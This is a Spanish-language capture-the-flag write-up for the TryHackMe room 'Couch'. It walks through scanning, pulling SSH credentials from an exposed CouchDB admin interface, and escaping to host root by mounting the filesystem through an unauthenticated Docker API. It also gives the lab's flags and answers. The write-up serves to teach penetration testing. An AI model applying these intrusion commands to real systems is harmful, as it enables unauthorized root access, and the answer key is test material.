# Couch

| **Dificultad** | Easy |
| **Tipo** | CTF |
| **Slug** | `couch` |
| **Link** | [TryHackMe](https://tryhackme.com/room/couch) |
| **Sección** | 01 Level Easy |
| **Fuente** | Writeup de Nandu (0xrodon, Medium) + k4713 (Medium) + hatamirais (GitHub) |
| **Componentes** | RustScan / nmap / CouchDB / Fauxton / SSH / Docker API / port forwarding |
| **Impacto** | Hackea un servidor CouchDB expuesto para obtener credenciales SSH y escala privilegios abusando de la API de Docker sin autenticación para montar el filesystem raíz del host. |

---

**Contexto:** Hackea un servidor de base de datos vulnerable (CouchDB) que almacena datos en formato de documentos JSON. Es un reto semi-guiado. Se explota CouchDB para obtener credenciales SSH, luego se escala privilegios abusando de la API de Docker.

## Solucionario

### Task 1: Escaneo

**Explicación:** Escaneo de puertos con nmap (el escaneo normal solo muestra 1 puerto; hay que usar RustScan para ver todos). El puerto 22 es SSH y el 5984 es CouchDB:

```
rustscan -a MACHINE_IP
```

```
Open 10.10.75.191:22
Open 10.10.75.191:5984
```

Acceder a CouchDB:

```
curl http://MACHINE_IP:5984
```

Devuelve la versión (1.6.1) y el OS (Ubuntu 16.04).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Scan the machine. How many ports are open? | `2` |
| 2 | What is the database management system installed on the server? | `couchdb` |
| 3 | What port is the database management system running on? | `5984` |
| 4 | What is the version of the management system installed on the server? | `1.6.1` |

### Task 2: Explotación de CouchDB

**Explicación:** CouchDB tiene una interfaz de administración web llamada **Fauxton**:

```
http://MACHINE_IP:5984/_utils/#/dashboard
```

En la base de datos secreta, en el documento con id `a1320dd69fb4570d0a3d26df4e000be7`, hay un campo `passwordbackup` con las credenciales SSH: `atena:t4qfzcc4qN##`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the path for the web administration tool for this database management system? | `_utils` |
| 2 | What is the path to list all databases in the web browser of the database management system? | `_all_dbs` |
| 3 | What are the credentials found in the web administration tool? | `atena:t4qfzcc4qN##` |

### Task 3: Acceso SSH

**Explicación:** Con las credenciales obtenidas, conectar por SSH:

```
ssh atena@MACHINE_IP
```

En el directorio home está `user.txt`:

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Compromise the machine and locate user.txt | `THM{1ns3cure_couchdb}` |

**Flag user:** `THM{1ns3cure_couchdb}` — "insecure couchdb" (couchdb inseguro).

### Task 4: Escalada de privilegios

**Explicación:** Revisar `.bash_history` y `netstat` para descubrir que estamos en un contenedor Docker y que hay un puerto Docker API en `127.0.0.1:2375`:

```
netstat -lnt
```

```
tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN
```

Hacer port forwarding del puerto 2375 a nuestra máquina local:

```
ssh -L 2375:127.0.0.1:2375 atena@MACHINE_IP
```

Escanear el puerto local y explotar la API de Docker sin autenticación para montar el filesystem raíz del host en un contenedor:

```
docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
```

Esto da una shell como root en el host. Leer `root.txt`:

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Escalate privileges and obtain root.txt | `THM{RCE_us1ng_Docker_API}` |

**Flag root:** `THM{RCE_us1ng_Docker_API}` — "RCE using Docker API" (ejecución remota de código usando la API de Docker).

---

**Metodología:**
1. **Recon:** escaneo de puertos (RustScan revela 22 y 5984; nmap normal solo muestra 22). El puerto 22 es SSH y el 5984 es CouchDB.
2. **Enumeración:** CouchDB 1.6.1 en el puerto 5984; `curl http://MACHINE_IP:5984` devuelve la versión (1.6.1) y el OS (Ubuntu 16.04); interfaz de administración web **Fauxton** en `http://MACHINE_IP:5984/_utils/#/dashboard`.
3. **Credenciales:** en la base de datos secreta, el documento con id `a1320dd69fb4570d0a3d26df4e000be7` tiene un campo `passwordbackup` con las credenciales SSH `atena:t4qfzcc4qN##`.
4. **Foothold:** SSH con las credenciales (`ssh atena@MACHINE_IP`) → `user.txt` (`THM{1ns3cure_couchdb}`).
5. **Privesc:** revisar `.bash_history` y `netstat -lnt` para descubrir que estamos en un contenedor Docker con la API en `127.0.0.1:2375`; hacer port forwarding (`ssh -L 2375:127.0.0.1:2375 atena@MACHINE_IP`) y abusar de la API sin autenticación montando el filesystem raíz del host: `docker -H tcp://127.0.0.1:2375 run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh` → shell root en el host → `root.txt` (`THM{RCE_us1ng_Docker_API}`).

**Learning chain:** recon (22, 5984) → CouchDB 1.6.1 → Fauxton (_utils/_all_dbs) → passwordbackup → SSH atena → user.txt → Docker API 2375 → port forward → docker mount chroot → root.txt.

**MITRE ATT&CK:** T1046 (Network Service Discovery), T1078 (Valid Accounts), T1210 (Exploitation of Remote Services), T1611 (Escape to Host).

**Fuente:** [TryHackMe - Couch](https://tryhackme.com/room/couch)